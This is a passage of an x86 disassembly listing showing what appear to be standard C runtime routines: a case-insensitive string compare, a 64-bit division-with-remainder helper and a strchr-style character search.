  428a5b:	je     0x428aaa
  428a5d:	mov    esi,DWORD PTR [ebp+0x8]
  428a60:	mov    edi,DWORD PTR [ebp+0xc]
  428a63:	mov    bh,0x41
  428a65:	mov    bl,0x5a
  428a67:	mov    dh,0x20
  428a69:	lea    ecx,[ecx+0x0]
  428a6c:	mov    ah,BYTE PTR [esi]
  428a6e:	or     ah,ah
  428a70:	mov    al,BYTE PTR [edi]
  428a72:	je     0x428a9b
  428a74:	or     al,al
  428a76:	je     0x428a9b
  428a78:	add    esi,0x1
  428a7b:	add    edi,0x1
  428a7e:	cmp    ah,bh
  428a80:	jb     0x428a88
  428a82:	cmp    ah,bl
  428a84:	ja     0x428a88
  428a86:	add    ah,dh
  428a88:	cmp    al,bh
  428a8a:	jb     0x428a92
  428a8c:	cmp    al,bl
  428a8e:	ja     0x428a92
  428a90:	add    al,dh
  428a92:	cmp    ah,al
  428a94:	jne    0x428aa1
  428a96:	sub    ecx,0x1
  428a99:	jne    0x428a6c
  428a9b:	xor    ecx,ecx
  428a9d:	cmp    ah,al
  428a9f:	je     0x428aaa
  428aa1:	mov    ecx,0xffffffff
  428aa6:	jb     0x428aaa
  428aa8:	neg    ecx
  428aaa:	mov    eax,ecx
  428aac:	pop    ebx
  428aad:	pop    esi
  428aae:	pop    edi
  428aaf:	leave  
  428ab0:	ret    
  428ab1:	int3   
  428ab2:	int3   
  428ab3:	int3   
  428ab4:	int3   
  428ab5:	int3   
  428ab6:	int3   
  428ab7:	int3   
  428ab8:	int3   
  428ab9:	int3   
  428aba:	int3   
  428abb:	int3   
  428abc:	int3   
  428abd:	int3   
  428abe:	int3   
  428abf:	int3   
  428ac0:	push   esi
  428ac1:	mov    eax,DWORD PTR [esp+0x14]
  428ac5:	or     eax,eax
  428ac7:	jne    0x428af1
  428ac9:	mov    ecx,DWORD PTR [esp+0x10]
  428acd:	mov    eax,DWORD PTR [esp+0xc]
  428ad1:	xor    edx,edx
  428ad3:	div    ecx
  428ad5:	mov    ebx,eax
  428ad7:	mov    eax,DWORD PTR [esp+0x8]
  428adb:	div    ecx
  428add:	mov    esi,eax
  428adf:	mov    eax,ebx
  428ae1:	mul    DWORD PTR [esp+0x10]
  428ae5:	mov    ecx,eax
  428ae7:	mov    eax,esi
  428ae9:	mul    DWORD PTR [esp+0x10]
  428aed:	add    edx,ecx
  428aef:	jmp    0x428b38
  428af1:	mov    ecx,eax
  428af3:	mov    ebx,DWORD PTR [esp+0x10]
  428af7:	mov    edx,DWORD PTR [esp+0xc]
  428afb:	mov    eax,DWORD PTR [esp+0x8]
  428aff:	shr    ecx,1
  428b01:	rcr    ebx,1
  428b03:	shr    edx,1
  428b05:	rcr    eax,1
  428b07:	or     ecx,ecx
  428b09:	jne    0x428aff
  428b0b:	div    ebx
  428b0d:	mov    esi,eax
  428b0f:	mul    DWORD PTR [esp+0x14]
  428b13:	mov    ecx,eax
  428b15:	mov    eax,DWORD PTR [esp+0x10]
  428b19:	mul    esi
  428b1b:	add    edx,ecx
  428b1d:	jb     0x428b2d
  428b1f:	cmp    edx,DWORD PTR [esp+0xc]
  428b23:	ja     0x428b2d
  428b25:	jb     0x428b36
  428b27:	cmp    eax,DWORD PTR [esp+0x8]
  428b2b:	jbe    0x428b36
  428b2d:	dec    esi
  428b2e:	sub    eax,DWORD PTR [esp+0x10]
  428b32:	sbb    edx,DWORD PTR [esp+0x14]
  428b36:	xor    ebx,ebx
  428b38:	sub    eax,DWORD PTR [esp+0x8]
  428b3c:	sbb    edx,DWORD PTR [esp+0xc]
  428b40:	neg    edx
  428b42:	neg    eax
  428b44:	sbb    edx,0x0
  428b47:	mov    ecx,edx
  428b49:	mov    edx,ebx
  428b4b:	mov    ebx,ecx
  428b4d:	mov    ecx,eax
  428b4f:	mov    eax,esi
  428b51:	pop    esi
  428b52:	ret    0x10
  428b55:	int3   
  428b56:	int3   
  428b57:	int3   
  428b58:	int3   
  428b59:	int3   
  428b5a:	int3   
  428b5b:	int3   
  428b5c:	int3   
  428b5d:	int3   
  428b5e:	int3   
  428b5f:	int3   
  428b60:	lea    eax,[edx-0x1]
  428b63:	pop    ebx
  428b64:	ret    
  428b65:	lea    esp,[esp+0x0]
  428b6c:	lea    esp,[esp+0x0]
  428b70:	xor    eax,eax
  428b72:	mov    al,BYTE PTR [esp+0x8]
  428b76:	push   ebx
  428b77:	mov    ebx,eax
  428b79:	shl    eax,0x8
  428b7c:	mov    edx,DWORD PTR [esp+0x8]
  428b80:	test   edx,0x3
  428b86:	je     0x428b9d
  428b88:	mov    cl,BYTE PTR [edx]
  428b8a:	add    edx,0x1
  428b8d:	cmp    cl,bl
  428b8f:	je     0x428b60
  428b91:	test   cl,cl
  428b93:	je     0x428be6
  428b95:	test   edx,0x3
  428b9b:	jne    0x428b88
  428b9d:	or     ebx,eax
  428b9f:	push   edi
  428ba0:	mov    eax,ebx
  428ba2:	shl    ebx,0x10
  428ba5:	push   esi
  428ba6:	or     ebx,eax
  428ba8:	mov    ecx,DWORD PTR [edx]
  428baa:	mov    edi,0x7efefeff
  428baf:	mov    eax,ecx
  428bb1:	mov    esi,edi
  428bb3:	xor    ecx,ebx
  428bb5:	add    esi,eax
  428bb7:	add    edi,ecx
  428bb9:	xor    ecx,0xffffffff
  428bbc:	xor    eax,0xffffffff
  428bbf:	xor    ecx,edi
  428bc1:	xor    eax,esi
  428bc3:	add    edx,0x4
  428bc6:	and    ecx,0x81010100
  428bcc:	jne    0x428bea
  428bce:	and    eax,0x81010100
  428bd3:	je     0x428ba8
  428bd5:	and    eax,0x1010100
  428bda:	jne    0x428be4
  428bdc:	and    esi,0x80000000
  428be2:	jne    0x428ba8
  428be4:	pop    esi
  428be5:	pop    edi
  428be6:	pop    ebx
  428be7:	xor    eax,eax
  428be9:	ret    
  428bea:	mov    eax,DWORD PTR [edx-0x4]
  428bed:	cmp    al,bl
  428bef:	je     0x428c27
  428bf1:	test   al,al
  428bf3:	je     0x428be4
  428bf5:	cmp    ah,bl
  428bf7:	je     0x428c20
  428bf9:	test   ah,ah
  428bfb:	je     0x428be4
  428bfd:	shr    eax,0x10
  428c00:	cmp    al,bl
  428c02:	je     0x428c19
  428c04:	test   al,al
  428c06:	je     0x428be4
  428c08:	cmp    ah,bl
  428c0a:	je     0x428c12
  428c0c:	test   ah,ah
  428c0e:	je     0x428be4
  428c10:	jmp    0x428ba8
  428c12:	pop    esi
  428c13:	pop    edi
  428c14:	lea    eax,[edx-0x1]
  428c17:	pop    ebx
  428c18:	ret    
  428c19:	lea    eax,[edx-0x2]
  428c1c:	pop    esi
  428c1d:	pop    edi
  428c1e:	pop    ebx
  428c1f:	ret    
  428c20:	lea    eax,[edx-0x3]
  428c23:	pop    esi
  428c24:	pop    edi
  428c25:	pop    ebx
  428c26:	ret    
  428c27:	lea    eax,[edx-0x4]
  428c2a:	pop    esi
  428c2b:	pop    edi
  428c2c:	pop    ebx
  428c2d:	ret    
  428c2e:	jmp    DWORD PTR ds:0x429104
